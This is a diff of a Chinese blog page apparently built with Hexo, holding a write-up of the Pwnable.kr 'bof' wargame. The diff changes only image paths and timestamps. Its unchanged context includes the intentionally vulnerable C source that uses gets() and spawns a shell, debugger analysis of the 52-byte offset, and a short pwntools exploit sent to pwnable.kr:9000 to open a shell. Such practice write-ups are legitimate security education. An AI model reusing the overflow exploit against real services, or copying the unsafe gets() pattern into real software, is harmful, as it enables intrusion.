@@ -17,15 +17,15 @@
 <meta property="og:site_name" content="Thriumph">
 <meta property="og:description" content="0x03">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://yoursite.com/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
-<meta property="og:image" content="http://yoursite.com/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
-<meta property="og:image" content="http://yoursite.com/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg">
-<meta property="og:image" content="http://yoursite.com/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg">
-<meta property="og:updated_time" content="2019-08-18T18:28:07.418Z">
+<meta property="og:image" content="http://yoursite.com/..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
+<meta property="og:image" content="http://yoursite.com/..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
+<meta property="og:image" content="http://yoursite.com/..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg">
+<meta property="og:image" content="http://yoursite.com/..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg">
+<meta property="og:updated_time" content="2019-08-18T18:42:21.265Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【Pwnable.kr】bof">
 <meta name="twitter:description" content="0x03">
-<meta name="twitter:image" content="http://yoursite.com/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
+<meta name="twitter:image" content="http://yoursite.com/..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -296,14 +296,14 @@
 <h1 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h1 id="源码分析："><a href="#源码分析：" class="headerlink" title="源码分析："></a>源码分析：</h1><p>func()函数中的overflowme是一个长度为32的字符串，调用get函数时会造成缓冲区溢出，只需覆盖key的值为0xcafebabe就行了。</p>
-<h1 id="用ida"><a href="#用ida" class="headerlink" title="用ida"></a>用ida</h1><p><img src="/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg" alt></p>
+<h1 id="用ida"><a href="#用ida" class="headerlink" title="用ida"></a>用ida</h1><p><img src="..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg" alt></p>
 <p>用ida打开发现overflowme的基址为ebp-0x2c，即44个字节，再加上ebp和返回地址的8个字节就是52个字节，覆盖掉就行</p>
-<h1 id="用gdb调试"><a href="#用gdb调试" class="headerlink" title="用gdb调试"></a>用gdb调试</h1><h2 id="用gdb调试：gdb-bof"><a href="#用gdb调试：gdb-bof" class="headerlink" title="用gdb调试：gdb ./bof"></a>用gdb调试：<code>gdb ./bof</code></h2><h2 id="在main函数处下断点-b-main"><a href="#在main函数处下断点-b-main" class="headerlink" title="在main函数处下断点:b main"></a>在main函数处下断点:<code>b main</code></h2><p><img src="/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg" alt></p>
-<h2 id="运行：r"><a href="#运行：r" class="headerlink" title="运行：r"></a>运行：<code>r</code></h2><h2 id="单步执行：n"><a href="#单步执行：n" class="headerlink" title="单步执行：n"></a>单步执行：<code>n</code></h2><h2 id="进入func函数内部：s"><a href="#进入func函数内部：s" class="headerlink" title="进入func函数内部：s"></a>进入func函数内部：<code>s</code></h2><h2 id="继续单步执行到get函数：n"><a href="#继续单步执行到get函数：n" class="headerlink" title="继续单步执行到get函数：n"></a>继续单步执行到get函数：<code>n</code></h2><h2 id="查看esp：x-40xw-esp"><a href="#查看esp：x-40xw-esp" class="headerlink" title="查看esp：x/40xw $esp"></a>查看esp：<code>x/40xw $esp</code></h2><p><img src="/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg" alt></p>
+<h1 id="用gdb调试"><a href="#用gdb调试" class="headerlink" title="用gdb调试"></a>用gdb调试</h1><h2 id="用gdb调试：gdb-bof"><a href="#用gdb调试：gdb-bof" class="headerlink" title="用gdb调试：gdb ./bof"></a>用gdb调试：<code>gdb ./bof</code></h2><h2 id="在main函数处下断点-b-main"><a href="#在main函数处下断点-b-main" class="headerlink" title="在main函数处下断点:b main"></a>在main函数处下断点:<code>b main</code></h2><p><img src="..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434983.jpg" alt></p>
+<h2 id="运行：r"><a href="#运行：r" class="headerlink" title="运行：r"></a>运行：<code>r</code></h2><h2 id="单步执行：n"><a href="#单步执行：n" class="headerlink" title="单步执行：n"></a>单步执行：<code>n</code></h2><h2 id="进入func函数内部：s"><a href="#进入func函数内部：s" class="headerlink" title="进入func函数内部：s"></a>进入func函数内部：<code>s</code></h2><h2 id="继续单步执行到get函数：n"><a href="#继续单步执行到get函数：n" class="headerlink" title="继续单步执行到get函数：n"></a>继续单步执行到get函数：<code>n</code></h2><h2 id="查看esp：x-40xw-esp"><a href="#查看esp：x-40xw-esp" class="headerlink" title="查看esp：x/40xw $esp"></a>查看esp：<code>x/40xw $esp</code></h2><p><img src="..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg" alt></p>
 <p>esp存储的地址是0xfffd280,overflowme数组开始的地址就是0xfffd280，而0xffffcef0这个地址存储的是0xdeadbeef即key，需要覆盖的长度为52</p>
 <h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">key=p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">p=remote(<span class="string">"pwnable.kr"</span>,<span class="number">9000</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">52</span>+key)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg" alt></p>
+<p><img src="..%5Cimages%5C%E3%80%90Pwnable-kr%E3%80%91bof%5Col-1566122434984.jpg" alt></p>
 <blockquote>
 <p>daddy, I just pwned a buFFer :)</p>
 </blockquote>
@@ -318,7 +318,7 @@
         <p><span>本文标题:</span><a  href="/【Pwnable-kr】bof.html">【Pwnable.kr】bof</a></p>
         <p><span>文章作者:</span><a  href="/" title="访问 Thriumph 的个人博客">Thriumph</a></p>
         <p><span>发布时间:</span>2019年05月31日 - 00时36分</p>
-        <p><span>最后更新:</span>2019年08月19日 - 02时28分</p>
+        <p><span>最后更新:</span>2019年08月19日 - 02时42分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/【Pwnable-kr】bof.html" title="【Pwnable.kr】bof">http://yoursite.com/【Pwnable-kr】bof.html</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/【Pwnable-kr】bof.html　　作者: Thriumph" title=""></span>
